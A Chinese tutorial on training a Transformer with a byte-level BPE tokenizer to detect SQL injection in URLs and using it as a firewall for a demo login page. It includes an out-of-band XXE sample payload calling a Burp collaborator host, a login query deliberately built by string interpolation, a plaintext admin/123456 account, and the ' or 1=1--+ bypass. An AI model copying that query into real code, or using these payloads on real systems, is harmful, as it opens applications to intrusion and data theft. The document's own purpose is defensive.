## 使用transformer和bbpe技术来完成SQL识别

**项目地址：**

**文件介绍：**

模型创建：attention.py ,TransformerBlock.py , encoder.py , model.py

自然语言处理：bbpe.py

生成模型：run.py

预测：predict.py

预测结果保存的文件：prediction_results_test.txt,prediction_results_train.txt

保存的模型：sql_classifier_model.pth

词表（bbpe）：tokenizer.py

序列化结果:test_sequences.json,train_sequences.json

## 简介

使用bbpe技术，将每一个样本的文本切成合适大小的token，然后将token化为对应的索引。索引embedding处理+每一个token的位置编码，将这个数据喂给transformer，得到上下文的理解。将这个理解传给分类层（全连接层），来完成分类任务，得到分类模型。利用该模型作为防火墙来防御SQL payload。



## 为什么使用BBPE?

在最初的NLP(自然语言处理)中，建立词表有两种方式。

一种是一个词对应一个索引，比如I love machiner learning,词表就是I:0, love:1, machine:2, learing:3,但是这有个致命问题，那就是词表爆炸(单词数量太大)和OOV(不在词表中的词)。

还有一种是一个字母对应一个索引，就是a:0,b:2,c:3·····这种，虽然没有OOV，并且词表非常小，也很简单，但是当序列很长时，计算量就非常大，还有学不到词的概念，不知道select,word,id这些关键词，需要大量的数据。

所以BBPE出现了，他是介于字符与词之间，即通过改进单字母方案来得到含有词和字母的词表。他是以字节或者子词为单位，即可以包含字母或者单词，能够缓解oov问题。

## BBPE原理

BBPE首先会遍历所有的训练样本来建立tokenizer(词汇表)，然后利用词汇表保存的合并规则merges和词对应的索引表token2id对所有的文本进行编码化。

编码化过程：会先利用merges来对样本里面每一个单词里面的字符或者字符对进行合并，然后将合并后的所有字符或者字符对转化为对应的索引。

**merges**:rank表示合并的优先级

<img src="https://gitee.com/zlinping/tuku2025/raw/master/image-20260206215931839.png" alt="image-20260206215931839" style="zoom:150%;" />

**token2id**:

![image-20260206220020196](https://gitee.com/zlinping/tuku2025/raw/master/image-20260206220020196.png)

### 生成tokenizer

1.**初始化词汇表**，即将样本的每一个单词拆成“字符+结束符</w>”。比如一个样本里面的里面的一个词select，那么初始化就是['s','e','l','e','c','t','</w>’]，一个词就是一个小列表，然后转化为元组，防止变化。

    def _word_to_symbols(word: str) -> Tuple[str, ...]:
        return tuple(list(word) + ["</w>"]
2.**字符对频率统计**，遍历每一个词相邻的字符，统计所有相邻字符的频率。并将这个频率装进哈希表Counter。比如select这个词的元组('s','e','l','e','c','t'),那么哈希表中,'se'的频率+1，‘el’的频率+1，‘ec’的频率+1，‘ct’的频率+1。

```
def _get_stats(self, vocab: Dict[Tuple[str, ...], int]) -> Counter:
    pairs = Counter()	#哈希表
    for word, freq in vocab.items():
        if len(word) < 2:	#保证这个词的长度大于1
            continue	
        for i in range(len(word) - 1):
            pair = (word[i], word[i + 1])
            pairs[pair] += freq		#增加频率	
    return pairs
```

3.**合并频率最高的字节对**，在完成字符对频率统计后，找出频率最高的字节对，然后将所有单词里面出现的这两个字符或者字符对都合并。比如我这次找到's','el'同时出现的概率最高，那么每一个样本里面的所有单词里面的's','el'都会合并成'sel'。

找出符合条件的最高频率对。合并条件：1.频率>min_freq。2.频率对加起来的长度<max_token_length。

```
most_common_pairs = stats.most_common()		#进行排序，从高到低

best_pair = None
best_freq = None
for pair, freq in most_common_pairs:		#频率对长度小于最大长度
    if len(pair[0] + pair[1]) <= max_token_length:
        best_pair = pair
        best_freq = freq
        break

if best_pair is None or best_freq < self.min_freq:	#频率对需要大于阈值
    break

self.merges[best_pair] = i
vocab = self._merge_vocab(best_pair, vocab)
```

一次合并。

    def _merge_vocab(
        pair: Tuple[str, str], vocab: Dict[Tuple[str, ...], int]
    ) -> Dict[Tuple[str, ...], int]:
    
        new_vocab: Dict[Tuple[str, ...], int] = {}
        first, second = pair
        new_symbol = first + second
    
        for word, freq in vocab.items():
            word_list = list(word)
            i = 0
            new_word: List[str] = []
    
            while i < len(word_list):
                if (
                    i < len(word_list) - 1
                    and word_list[i] == first
                    and word_list[i + 1] == second
                ):
                    new_word.append(new_symbol)
                    i += 2
                else:
                    new_word.append(word_list[i])
                    i += 1
    
            new_vocab[tuple(new_word)] = freq
    
        return new_vocab

4.**不断重复合并过程**（统计字符对频率->找到频率最高的字符对->合并样本里面的字符对），我这里合并次数设为1000次，当合并次数到达1000次或者没有满足条件的字符对，就停止合并。

```
#执行num_merges次
for i in range(self.num_merges):
    stats = self._get_stats(vocab)  #统计词表中每一个向量词对的频率
    if not stats:
        if verbose:
            print(f"[BBPE] 提前停止：没有可合并的字符对")
        break

    #按照频率（两个字符相邻的次数）对stats进行排序，从高到底
    most_common_pairs = stats.most_common()

    #开始合并
    best_pair=None
    best_freq=None
    for pair,freq in most_common_pairs:
        if len(pair[0]+pair[1])<=max_token_length:
            best_pair=pair   #得到合并规则
            best_freq=freq   #这两个字符共同出现的频率，必须保证满足大于min_freq，才能够合并
            break

    if best_pair is None or best_freq < self.min_freq:   #如果不满足合并原则，则不能合并，那么合并就结束
        if verbose:
            print(f"[BBPE] 提前停止：最高频率 {best_freq} < min_freq {self.min_freq}")
        break
    
    self.merges[best_pair] = i  #将合并的过程放进merges这个字典中
    vocab = self._merge_vocab(best_pair, vocab)     #执行一次合并
```

5.**进行去重和建立索引**，将词汇表放进集合中，然后用ascii码进行排序，并设置索引。

```
tokens = set()
for word in vocab.keys():
    tokens.update(word)     #把vocab里面所有的子词放进tokens里面，并且刚好去重

#使用ascii码排序
sorted_tokens = sorted(tokens)

#构造字符->id的词汇表,给每一个字符设置一个索引
self.token2id = {tok: i + 1 for i, tok in enumerate(sorted_tokens)}
#pad的索引专门为0
self.token2id["<pad>"] = 0
#利用token2id来设置id2token表,id->索引
self.id2token = {i: t for t, i in self.token2id.items()}
```

经过以上的过程就完成的词汇表tokenizer的创建。

### 文本编码

对一个词进行编码

```
def encode_word(self, word: str) -> List[str]:
    """
    通过merges,将一个新词合成token(vocab里面的字符)
    """
    symbols: List[str] = list(self._word_to_symbols(word))  #将这个词的所有字母提取出来
    if not self.merges:
        return symbols

    while True:
        if len(symbols) < 2:
            break
        pairs = [(symbols[i], symbols[i + 1]) for i in range(len(symbols) - 1)] #将symbols向量的字符作为一个值，放进pairs

        #看pairs(相邻的字符对)是否在merges里面，并且看在第几个位置
        merge_candidates = [
            (pair, self.merges[pair]) for pair in pairs if pair in self.merges
        ]
        #如果不存在，就结束，不合体
        if not merge_candidates:
            break
        #比较所有字符对的优先合成顺序，比如：s与l的合成顺序是1，l与e的合成顺序是2，那么s与l先合成
        best_pair = min(merge_candidates, key=lambda x: x[1])[0]

        #开始合成
        new_symbols: List[str] = []
        i = 0
        while i < len(symbols):
            #满足合成条件（即相邻的两个字符等于best_pair对应的字符对）的合成
            if (
                i < len(symbols) - 1
                and symbols[i] == best_pair[0]
                and symbols[i + 1] == best_pair[1]
            ):
                new_symbols.append(best_pair[0] + best_pair[1])
                i += 2
            #不满足合成条件，直接将这个字母放进去new_symbols
            else:
                new_symbols.append(symbols[i])
                i += 1
        symbols = new_symbols
    return symbols
```

遍历每一个样本的每一个词使用上述方法，但是还有一个问题，就是每一个样本的序列长度是不一样的，但是模型要求每一个样本的shape必须一样，所以必须统一长度，我统一长度为512。

```
max_len = 512  # 设置为512，保留更多特征
sequences = [seq[:max_len] for seq in sequences]	#截断

padded = []
for seq in sequences:	#增加
    pad_len = max_len - len(seq)
    padded.append(seq + [0] * pad_len)
```

这样就完成了文本编码，也就是可以直接喂给模型的数据了

比如第一个数据：/cv?uuid=69c0af3ce4caa8a131e86d0a879c55d6&tc=2682316437&p=kscan.exe&c=0

进行编码后：

<img src="https://gitee.com/zlinping/tuku2025/raw/master/image-20260206231227716.png" alt="image-20260206231227716" style="zoom:50%;" />

整个长度512，每一个数字对应词汇表里面的词，比如126对应“/”,789对应“id=”

![image-20260206231602785](https://gitee.com/zlinping/tuku2025/raw/master/image-20260206231602785.png)

还有其他的比较常见的子词，展示：

![image-20260212135835303](https://gitee.com/zlinping/tuku2025/raw/master/image-20260212135835303.png)

![](https://gitee.com/zlinping/tuku2025/raw/master/image-20260212135835303.png)

## 模型创建

使用transformer的encoder，来得到上下文的理解，作用就像CNN来提取特征，然后再加上一个分类层

流程：

1.attention.py：自注意力机制创建

2.TransformerBlock.py：多头自注意力机制+残缺连接+层归一化+前馈网络

3.Encoder.py：位置编码+向量化的结果传进多层的TransformerBlock功能模块

4.model.py：Encoder+分类层

### 流程实现  

#### **attention.py**

**创建多头自注意力机制功能。**将Q,K,V进行拆分，然后计算相关性，并且将填充位置设为无穷小。

![image-20260208153137113](https://gitee.com/zlinping/tuku2025/raw/master/image-20260208153137113.png)



函数：

__init__

初始化类，初始化输入层词向量维度大小，多头自注意力机制的头数，每一个头的输入的维度，计算Q,K,V的线性层，输出层，将Q,K,V映射到原来的维度。

```
def __init__(self, embed_size, heads):
    super(SelfAttention, self).__init__()
    self.embed_size = embed_size
    self.heads = heads
    self.head_dim = embed_size // heads
    
    assert self.head_dim * heads == embed_size
    
    self.values = nn.Linear(embed_size, embed_size)
    self.queries = nn.Linear(embed_size, embed_size)
    self.keys = nn.Linear(embed_size, embed_size)
    self.fc_out = nn.Linear(embed_size, embed_size)
```

**forward**

前向传播流程：

1.计算样本数量和每一个样本的序列长度	

```
N = values.size(0)
seq_len = values.size(1)
```

2.计算Q,K,V

```
values = self.values(values)
keys = self.keys(keys)
queries = self.queries(query)
```

3.将计算好的Q,K,V分成几份，给几个头，每一份的维度：(样本个数,样本的序列长度,头数,每一个头的维度)

```
values = values.reshape(N, seq_len, self.heads, self.head_dim)
keys = keys.reshape(N, seq_len, self.heads, self.head_dim)
queries = queries.reshape(N, seq_len, self.heads, self.head_dim)
```

4.计算每一个头的注意力分数,Q*K(T)<img src="https://gitee.com/zlinping/tuku2025/raw/master/image-20260125211923024.png" alt="image-20260125211923024" style="zoom: 50%;" />

```
energy = torch.einsum("nqhd,nkhd->nhqk", [queries, keys])
```

5.利用padding mask,将填充位置的注意力分数化为特别小<img src="https://gitee.com/zlinping/tuku2025/raw/master/image-20260125211957880.png" alt="image-20260125211957880" style="zoom:50%;" />

```
if mask is not None:
	mask = mask.expand(-1, -1, seq_len, -1)
	energy = energy.masked_fill(mask == 0, float("-1e20"))
```

6.将注意力分数转化为概率分布，即得到注意力权重<img src="https://gitee.com/zlinping/tuku2025/raw/master/image-20260125212335189.png" alt="image-20260125212335189" style="zoom:50%;" />

```
attention_weight = torch.softmax(energy / (self.head_dim ** 0.5), dim=3)
```

7.将注意力权重与K权重相加，得到每一个头的attetion<img src="https://gitee.com/zlinping/tuku2025/raw/master/image-20260125212221357.png" alt="image-20260125212221357" style="zoom:50%;" />

```
attention = torch.einsum("nhqk,nkhd->nqhd", [attention_weight, values])
```

8.将几个头的attention矩阵concat起来，

```
out = attention.reshape(N, seq_len, self.heads * self.head_dim)
```

9.将concat得到的矩阵映射到输入层的维度：(样本个数，序列长度，词向量维度)

```
out = self.fc_out(out)
```

10.返回结果

```
return out
```

#### TransformerBlock.py

**使用多头注意力机制得到的结果，进行残缺连接和层归一化，前馈网络，然后残缺连接和层归一化**。



![image-20260208153223469](https://gitee.com/zlinping/tuku2025/raw/master/image-20260208153223469.png)

函数：

__init__

初始化输入层维度，头数，前馈网络的扩大倍数，正则化。然后利用输入层维度和头数来初始化自注意力层。设置前馈网络层，归一化层，正则化系数。

```
def __init__(self, embed_size, num_heads, forwarded_expand, dropout):
    super(TransformerBlock, self).__init__()
    self.embed_size = embed_size
    self.num_heads = num_heads
    self.forwarded_expand = forwarded_expand
    self.dropout = dropout

    self.attention = SelfAttention(embed_size, num_heads)
    self.norm1 = nn.LayerNorm(embed_size)
    
    self.feed_forward = nn.Sequential(
        nn.Linear(embed_size, forwarded_expand * embed_size),
        nn.ReLU(),
        nn.Linear(forwarded_expand * embed_size, embed_size),
    )
    
    self.norm2 = nn.LayerNorm(embed_size)
```

**forward**

1.利用attention构造的自注意力机制来计算得到自注意力attention

```
attention=self.attention(value,key,query,mask)
```

2.进行残缺连接y=F(x)+x=attention+Q,然后继续层归一化，norm(y)，然后利用dropout来防过拟合

```
x=self.dropout(self.norm1(attention+query))
```

3.将上一个结果带进前馈网络：升维度->非线性函数->降维。升维是为了让Relu函数提取出高阶特征（即有用的特征），将没有用的特征去掉为0，并且增强模型的表达能力，降维为了保证维度和输入层一致。

```
forward=self.feed_forward(x)
```

4.再次进行残缺连接和层归一化，Dropout

```
out=self.dropout(self.norm2(forward+x))
```

5.返回一层的Encoder结果

```
return out
```

#### Encoder.py

**位置编码和向量化相加的结果，放进num_layer层Transformer模块**

预处理：

![image-20260208153651684](https://gitee.com/zlinping/tuku2025/raw/master/image-20260208153651684.png)

多层堆叠：

![image-20260208153714260](https://gitee.com/zlinping/tuku2025/raw/master/image-20260208153714260.png)

函数

__init__

```
    def__init__(self,vocab_size,embed_size,num_layers,heads,device,forward_expansion,dropout,max_length):
        super(Encoder,self).__init__()
        self.embed_size=embed_size
        self.device=device

        #词嵌入层,将词表中的每一个词用embed_size维表示,创建一个查表矩阵
        self.word_embedding=nn.Embedding(vocab_size,embed_size)

        #位置编码,给序列（一句话）中每一个词的位置用embed_size维来表示
        self.position_embedding=nn.Embedding(max_length,embed_size)

        #堆叠Transformer功能模块,一共num_layers层Transformer
        self.layers=nn.ModuleList([
            TransformerBlock(
                embed_size,heads,forward_expansion,dropout
            )
            for _ in range(num_layers)
        ])

        #Dropout
        self.dropout=nn.Dropout(dropout)

```

**forward**

获取样本个数，每一个样本的长度

```
N,seq_len=x.shape[0],x.shape[1]
```

生成位置索引，然后将位置索引化为更高维度

```
positions=torch.arange(0,seq_length).expand(N,seq_length).to(self.device)
position_embedding=self.position_embedding(positions)
```

向量化每一个样本，利用查找表，给序列的每一个词化为更高索引

```
position_embedding=self.position_embedding(positions)
```

将向量化与位置编码化结果相加

```
out=self.dropout(word_embedding+position_embedding)
```

将预处理的结果放进堆叠好的Transformer模块

```
for layer in self.layers:
       out=layer(out,out,out,mask)
```

将encoder生成的上下文的理解返回

```
return out
```

#### model.py

**将Encoder的结果进行平均池化，然后传给分类层，生成结果：分类结果。这里的Encoder就是一个比较特殊的，强大的CNN。**

![image-20260208154303231](https://gitee.com/zlinping/tuku2025/raw/master/image-20260208154303231.png)

函数

__init__

```
    def __init__(self,vocab_size,pad_idx,embed_size=512,num_layers=6,forward_expansion=4,
                 heads=8,dropout=0,device='cuda',max_length=512,num_classes=1):
        super(model,self).__init__()

        #建立Encoder
        self.encoder=Encoder(vocab_size,embed_size,num_layers,heads,device,forward_expansion, dropout, max_length)

        #保存有效位置的掩码
        self.pad_idx=pad_idx
        
        #添加分类层，将encoder输出转换为分类结果
        self.fc=nn.Linear(embed_size,num_classes)
```

**make_src_mask**

生成每一个样本的每一个序列的掩码，大小：(N,1,1,seq_len)

```
    def make_src_mask(self,src):        
        src_mask=(src!=self.pad_idx).unsqueeze(1).unsqueeze(2)
        return src_mask
```

**forward**

生成掩码,来给encoder使用

```
src_mask=self.make_src_mask(x)
```

来利用Encoder生成上下文的理解

```
out=self.encoder(x,src_mask)
```

将上下文理解进行平均池化。

**什么是平均池化?**

例如：

平均池化前数据：![image-20260208202706872](https://gitee.com/zlinping/tuku2025/raw/master/image-20260208202706872.png)

平均池化：![image-20260208202723506](https://gitee.com/zlinping/tuku2025/raw/master/image-20260208202723506.png)

平均池化后后：![image-20260208202741047](https://gitee.com/zlinping/tuku2025/raw/master/image-20260208202741047.png)

即将每一个词的某一个向量加起来，然后除序列长度。即：![image-20260208203058204](https://gitee.com/zlinping/tuku2025/raw/master/image-20260208203058204.png)

out.sum(dim):把所有的token的512维加起来。比如将每一个词的第一维加起来。

mask_expand.sum(dim):计算有效token的总数

```
mask_expanded=src_mask.squeeze(1).squeeze(1).float()  
mask_expanded=mask_expanded.unsqueeze(-1)  #设置面具：(N,seq_len,embed_size)
out=out*mask_expanded  # 将padding位置置为0,即无效的token的维度变为0
out=out.sum(dim=1)/mask_expanded.sum(dim=1)  # 平均池化
```

得到分类结果

```
out=self.fc(out)
```

## 训练流程

### 数据加载

**步骤1**：读取数据，SQL.csv里面全是恶意的SQL语句。白.csv里面部分正常语句，部分是SQL恶意语句。正常文本的标签是0，恶意文本的1签是1。我使用url来作为训练数据，所以只读取URL即可。下图的第4行：

![image-20260212140217332](https://gitee.com/zlinping/tuku2025/raw/master/image-20260212140217332.png)

**步骤2**：将文本转化为机器看的懂的语言，使用tokenizer的merges来将里面的字符进行合并，然后利用token2id转化为对应的索引，OOV用0表示这个规则来编码文本。

**步骤3**：封装成TensorDataset，然后转化为DataLoader,能够让模型按批次读取数据，我设置的批次是32，那么每一次正向传播会使用到32个样本，而如果数据有320个样本，那么就会正向传播10次。

```
def load_data():
    # 读取正常数据和标签
    normal_csv = r"data\train\白.csv"
    normal_texts, normal_labels = load_sql_injection_data(normal_csv, text_col=3, label_col=6)
    print("正常数据：",len(normal_texts),len(normal_labels))
    # 读取恶意文本（SQL注入.csv)
    sql_csv = r"data\train\SQL注入.csv"
    sql_texts, sql_labels = load_sql_injection_data(sql_csv, text_col=3, label_col=6)
    print("SQL数据：",len(sql_texts),len(sql_labels))
    # 合并正常数据和SQL注入数据
    texts = normal_texts + sql_texts
    labels = normal_labels + sql_labels
    print("样本总数:",len(labels),"1的总数:",labels.count(1),"0的总数:",labels.count(0))
    x,tokenizer=vectorize_with_bbpe(texts, model_path="tokenizer.json", num_merges=1000, sequences_path="train_sequences.json")
    x=x[:,:512].long()
    #将标签的类型化为张量
    y=torch.tensor(labels,dtype=torch.long)

    print(len(x),len(y))
    #将数据和标签封装在Dataset
    dataset=TensorDataset(x,y)
    #将数据封装遭Dataloader
    dataloader=DataLoader(dataset,batch_size=32,shuffle=True)

    #返回这个迭代器(这样每一次训练可以取32份数据出来)
    return dataloader,len(tokenizer.token2id),tokenizer
```

### 权重计算和损失函数

恶意文本与正常文本的占比差别巨大，恶意是正常文本数量的3倍，所以我们要设置权重。若不手动设置权重，那么模型就会更加偏向数量多的类别。**假如不设置权重，那么模型在所有样本上的预测结果都是1。**



![image-20260207140849947](https://gitee.com/zlinping/tuku2025/raw/master/image-20260207140849947.png)

正常：异常=n ,那么就设为异常的权重是：n。即数量越大，那么赋予他的权重越小。

```
def get_pos_weight():
    #统计正常与异常的比例
    total_pos = 0
    total_neg = 0
    for batch_data, batch_labels in dataloader:
        batch_pos = (batch_labels == 1).sum().item()
        batch_neg = (batch_labels == 0).sum().item()
        total_pos += batch_pos
        total_neg += batch_neg
    #设置权重,给异常数据设置权重:0的数量/1的数量
    pos_weight_value = total_neg / total_pos
    print(f"[Loss] total_pos={total_pos}, total_neg={total_neg}, pos_weight={pos_weight_value:.4f}")
    pos_weight_tensor = torch.tensor([pos_weight_value], dtype=torch.float32, device=device)
    return pos_weight_tensor
```

利用权重设置损失函数。

**注意：**因为这里是二分类，所以我使用的是BCEWithLogitsLoss=Sigmoiad+BCELoss，BCEWithLogitsLoss里面是自带Sigmoiad函数的，所以在训练模型时，不用在模型的输出层再加Sigmoiad函数了。但是在预测就没有这个功能了，所以需要给预测结果加上Sigmoiad激活函数。

```
criterion = nn.BCEWithLogitsLoss(pos_weight=pos_weight)
```

### 定义优化器

```
#定义优化器
optimizer=torch.optim.Adam(model.parameters(),lr=5e-6)
```

### 创建模型

在训练中出现了模型坍塌，所有预测结果都是0，可能是模型过度依赖几个特征，应该是前面我设置权重的原因，所以要使用Dropout来让某一些神经元失活，防止过度依赖我设置的权重这个特征。

```
#设置模型参数
device=torch.device("cuda" if torch.cuda.is_available() else "cpu")
pad_idx = 0
embed_size = 512
num_layers = 6
forward_expansion = 4
heads = 8
dropout = 0.1
max_length = 512
num_classes = 1   # 二分类，用 BCEWithLogitsLoss，输出为 [0,1]

# 创建模型
model=model(
    vocab_size=vocab_size,
    pad_idx=pad_idx,
    embed_size=embed_size,
    num_layers=num_layers,
    forward_expansion=forward_expansion,
    heads=heads,
    dropout=dropout,
    device=device,
    max_length=max_length,
    num_classes=num_classes
)
model.to(device)
model.train()
```

### 开始训练

一轮训练。这里添加梯度裁剪功能，防止梯度爆炸，即给模型训练添加一个“安全带”。

```
#一轮训练
def train(dataloader,model,optimizer,criterion):
    device='cuda' if torch.cuda.is_available() else "cpu"
    #按批次训练，每一个批次取batch_size=32个样本进行训练
    for batch_idx,(data,labels) in enumerate(dataloader):
        data=data.to(device)
        labels=labels.to(device).float().unsqueeze(1)
        y_pred=model(data)  #正向传播
        loss=criterion(y_pred,labels)   #计算损失
        optimizer.zero_grad()           #梯度置零，因为梯度会相加
        loss.backward()                 #计算梯度
        # 添加梯度裁剪
        torch.nn.utils.clip_grad_norm_(model.parameters(), max_norm=1.0)
        optimizer.step()                #利用梯度来更新参数
        print(loss.item())
```

进行20轮

```
#开始训练：正向传播与反向传播.一个运行20轮。每一轮的每一次训练取32个样本
for epoch in range(20):
    if epoch==0:
        print("开始训练")
    train(dataloader,model,optimizer,criterion)
    print(f"第{epoch}次训练结束")
```

### 保存模型

保存模型的所有参数，用于在预测时直接调用该模型。

```
#保存模型
checkpoint = {
    "model_state_dict": model.state_dict(),  # 模型参数
    # 下面这些超参数用于在 predict.py 中正确重建模型结构
    "vocab_size": int(vocab_size),
    "pad_idx": int(pad_idx),
    "embed_size": int(embed_size),
    "num_layers": int(num_layers),
    "forward_expansion": int(forward_expansion),
    "heads": int(heads),
    "dropout": float(dropout),
    "max_length": int(max_length),
    "num_classes": int(num_classes),
}

torch.save(checkpoint, "sql_classifier_model.pth")
print("训练完成，模型已保存为: sql_classifier_model.pth")
```

## 评估

**在测试集和训练集都进行测试，来看准确**

#### 数据加载

使用训练代码的load_data来加载测试集上数据

#### 加载模型

使用torch.load来加载模型，然后将训练好的参数来加载到模型上。

```
def load_model():
    device = torch.device("cuda" if torch.cuda.is_available() else "cpu")
    # 加载整个模型
    checkpoint = torch.load("sql_classifier_model.pth", map_location=device, weights_only=False)
    # 得到模型的权重（参数）
    state_dict = checkpoint['model_state_dict']


    #读取参数，并转化类型
    ckpt_vocab_size = int(checkpoint["vocab_size"])
    ckpt_pad_idx = int(checkpoint["pad_idx"])
    ckpt_max_length = int(checkpoint["max_length"])
    ckpt_num_classes = int(checkpoint.get("num_classes", 1))  # 训练时就是 1
    device=torch.device("cuda" if torch.cuda.is_available() else "cpu")

    # 利用checkpoint来加载前面训练好的模型（使用完整的模型参数）
    classifier_model = Model(
        vocab_size=ckpt_vocab_size,
        pad_idx=ckpt_pad_idx,
        embed_size=checkpoint.get('embed_size', 512),
        num_layers=checkpoint.get('num_layers', 6),
        forward_expansion=checkpoint.get('forward_expansion', 4),
        heads=checkpoint.get('heads', 8),
        dropout=checkpoint.get('dropout', 0),
        device=device,
        max_length=ckpt_max_length,
        num_classes=ckpt_num_classes
    )

    classifier_model.load_state_dict(state_dict)  # 加载预训练权重

    # 将模型放在cpu上运行
    classifier_model.to(device)
    classifier_model.eval()
    return classifier_model,  ckpt_vocab_size
```

#### 正向传播

设阈值为0.5，大于0.5则为1，小于0.5则为0。并且需将正向传播结果利用Sigmoid函数进行处理，因为模型的输出层是没有自带Sigmoiad函数的。

```
def forward(loader,classifier_model,vocab_size):
    device = torch.device("cuda" if torch.cuda.is_available() else "cpu")
    y_preds = []
    with torch.no_grad():
        for batch in loader:  # 迭代

            inputs = batch[0].to(device)  # batch为list，batch[0]为Tensor，batch[0]就是解包

            # 强制检查越界：将超过词表范围的 ID 替换为 pad_idx
            max_token_id = vocab_size- 1
            pad_tensor = torch.zeros_like(inputs)
            inputs = torch.where(inputs > max_token_id, pad_tensor, inputs)
            outputs = classifier_model(inputs)  # 形状 [batch_size, 1]，为 logit

            # 对于二分类 + BCEWithLogitsLoss，正确做法是先过 sigmoid，再按阈值(0.5)划分
            probs = torch.sigmoid(outputs).squeeze(1)  # [batch_size]
            preds = (probs >= 0.5).long()  # 大于等于 0.5 判为 1，否则 0

            y_preds.append(preds.cpu())

    all_preds = torch.cat(y_preds)
    return all_preds
```

#### 评估和保存结果

将所有样本正向传播的结果与测试集上的标签进行对比，来计算准确率，并且保存结果为文件。

```
def save(path,all_preds,labels):
    with open(f"all_{path}_preds.json",'w',encoding="utf-8") as f:
        json.dump(all_preds.cpu().tolist(),f)

    #计算准确率
    all_labels = torch.tensor(labels, dtype=torch.long)  # 将标签转换为tensor
    correct = torch.sum(all_preds == all_labels).item()
    total = len(all_labels)
    accuracy = correct / total if total > 0 else 0
    print(f"正确预测数: {correct}/{total}")

    # 保存结果
    save_path = f"prediction_results_{path}.txt"
    with open(save_path, "w", encoding="utf-8") as f:
        f.write("=== SQL注入检测模型评估报告 ===\n")
        f.write(f"测试总样本数: {total}\n")
        f.write(f"正确预测次数: {correct}\n")
        f.write(f"最终准确率: {accuracy:.2%}\n")
        f.write("-" * 30 + "\n")
        for i in range(total):
            f.write(f"样本 {i}: 预测={all_preds[i].item()}, 真实={all_labels[i].item()}\n")
    print(f"\n结果已保存至: {save_path}")
    print(f"准确率: {accuracy:.2%}")
```

该图是在测试集上进行评估的结果：

![image-20260208163404349](https://gitee.com/zlinping/tuku2025/raw/master/image-20260208163404349.png)

该图是在训练集上评估的结果：

![image-20260208163442417](https://gitee.com/zlinping/tuku2025/raw/master/image-20260208163442417.png)

训练集和测试集上的结果非常接近并且准确率很高。说明该模型泛化能力很强，并且没有过拟合。现在我要使用这个模型作为防火墙进行登录验证。

## 模型应用

模型作为防火墙来防止SQL注入，首先我们需要一个函数来评价一个语句是否可能是恶意的SQL语句。

下面这个函数能够利用加载好的模型来预测文本是否是SQL恶意语句。这个文本处理跟前面是差不多的，就是测试数据的数量为1。但是这里要多一个步骤，**在进行BBPE处理前，需要对文本进行URL编码化**，因为在测试集和训练集上，所有的特征字符都进行了URL编码化。可以看一下。

```
/(select%20extractvalue(xmltype('%3c%3fxml%20version%3d%221.0%22%20encoding%3d%22UTF-8%22%3f%3e%3c!DOCTYPE%20root%20[%20%3c!ENTITY%20%25%20mvnsr%20SYSTEM%20%22http%3a//i4n8f79p0leq0d6kxm2cutoh2884w0k380vqjf.burpcollab'%7c%7c'orator.net/%22%3e%25mvnsr%3b]%3e')%2c'/l')%20from%20dual)/quarantine/juicy_malware_linux_arm_64.url
```

基本上特征字符，比如空格,引号等其他的都进行的URL编码化，所以我们自己输入的文本要进行URL编码

```

def predict_single_sql(text: str, threshold: float = 0.5):
    """
    预测一条自定义字符串是否为 SQL 注入。

    :param text: 待检测的字符串（如一段 URL、payload 等）
    :param threshold: 判定为 SQL 注入的概率阈值，默认 0.5
    :return: (pred_label, prob)，pred_label 为 0/1，prob 为预测为注入的概率
    """
    device = torch.device("cuda" if torch.cuda.is_available() else "cpu")

    # 统一在这里完成 URL 编码 / 规范化，调用方只需要传入原始文本
    normalized = _normalize_for_model(text)
    if not normalized:
        # 空文本直接返回“正常”，概率 0.0
        return 0, 0.0

    # 加载训练好的分类模型和词表大小
    classifier_model, ckpt_vocab_size = load_model()

    # 要包装为列表才行，因为read_csv也是列表里面包含字符串
    texts = [normalized]

    # 只复用训练好的 tokenizer，不重新训练，因此必须指定同一个 tokenizer.json
    x, _ = vectorize_with_bbpe(
        texts,
        model_path="tokenizer.json",
        num_merges=1000,
        sequences_path=None,   # 自定义输入不缓存到文件
    )

    # 截断 / 补零到 512，并放到对应设备
    x = x[:, :512].long().to(device)  # 形状 [1, 512]

    with torch.no_grad():
        # 和 batch 推理保持一致：防止越界 token id
        max_token_id = ckpt_vocab_size - 1
        pad_tensor = torch.zeros_like(x)
        x = torch.where(x > max_token_id, pad_tensor, x)

        # 前向推理，得到 logit → 概率
        outputs = classifier_model(x)          # [1, 1]
        probs = torch.sigmoid(outputs).squeeze(1)  # [1]

        prob = probs.item()
        pred_label = int(prob >= threshold)

    # 打印可读结果
    print(f"\n原始输入文本: {text}")
    print(f"送入模型的文本(已URL编码): {normalized}")
    print(f"预测概率(为 SQL 注入的概率): {prob:.4f}")
    print(f"预测标签: {pred_label}  ({'SQL 注入' if pred_label == 1 else '正常'})")

    return pred_label, prob

```

使用AI帮我做一个网页，来利用上面这个函数作为防火墙。提示词：帮我做一个网页，有一个登录界面，输入name和password，首先利用该模型检查是否有SQL注入风险，然后再检查密码和账号是否匹配。

这里使用SQLite来创建的数据库：

```

def init_db() -> None:
    """
    初始化一个简单的 SQLite 数据库，里面有一张 users 表：
    """
    conn = sqlite3.connect(DB_PATH)
    try:
        cur = conn.cursor()
        cur.execute(
            """
            CREATE TABLE IF NOT EXISTS users (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                username TEXT NOT NULL,
                password TEXT NOT NULL
            )
            """
        )
        # 确保至少有一个演示账号
        cur.execute("SELECT COUNT(*) FROM users WHERE username = 'admin'")
        count = cur.fetchone()[0]
        if count == 0:
            cur.execute(
                "INSERT INTO users (username, password) VALUES ('admin', '123456')"
            )
        conn.commit()
    finally:
        conn.close()
```

我列出SQL查询语句，我们来利用这个SQL语句来进行SQL注入

```
query = (
            "SELECT id, username FROM users "
            f"WHERE username = '{username}' AND password = '{password}'"
        )
```

好，现在我们开始测试这个waf怎么样

### 测试：

先看一下这个网页是否能够完成正常的登录功能

<img src="https://gitee.com/zlinping/tuku2025/raw/master/image-20260211213859339.png" alt="image-20260211213859339" style="zoom:33%;" />

<img src="https://gitee.com/zlinping/tuku2025/raw/master/image-20260211213859339.png" style="zoom:33%;" />

OK，能够完成登录功能，我们来开始SQL注入

#### 1.万能密码

最经典的万能密钥：' or 1=1--+

<img src="https://gitee.com/zlinping/tuku2025/raw/master/image-20260211212841709.png" alt="image-20260211212841709" style="zoom:33%;" />



<img src="https://gitee.com/zlinping/tuku2025/raw/master/image-20260211212852902.png" alt="image-20260211212852902" style="zoom:33%;" />

OK，能够完成SQL注入，在没有防火墙的前提下，但是如果开启防火墙呢，会怎么样。展示：

